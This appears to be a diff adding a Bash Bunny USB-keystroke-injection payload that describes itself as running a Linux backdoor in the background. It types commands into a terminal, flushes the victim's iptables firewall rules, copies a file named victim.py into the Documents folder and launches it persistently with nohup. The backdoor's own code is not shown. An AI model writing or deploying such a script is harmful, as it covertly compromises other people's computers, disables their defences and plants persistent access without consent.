@@ -1,0 +1,31 @@
+#!/bin/bash
+#
+# runs Linux backdoor in backdground 
+#
+
+# Setup
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+LED ATTACK
+RUN UNITY gnome-terminal 
+Q DELAY 1500 
+Q STRING export exepos=/run/media/\$USER/BashBunny/payloads/$SWITCH_POSITION #export payload location 
+Q ENTER 
+Q STRING iptables -F #flush IPTABLES 
+Q ENTER
+Q STRING cd \$exepos #go to payload location 
+Q ENTER
+Q STRING cp victim.py /\$USER/Documents/ #copy backdoor to victim Documents 
+Q ENTER
+Q DELAY 1000
+Q STRING cd /\$USER/Documents/ #change directory to Documents 
+Q ENTER 
+Q STRING nohup python victim.py \& #run backdoor 
+Q ENTER
+Q DELAY 1000
+Q STRING exit
+Q ENTER
+
+LED FINISH 
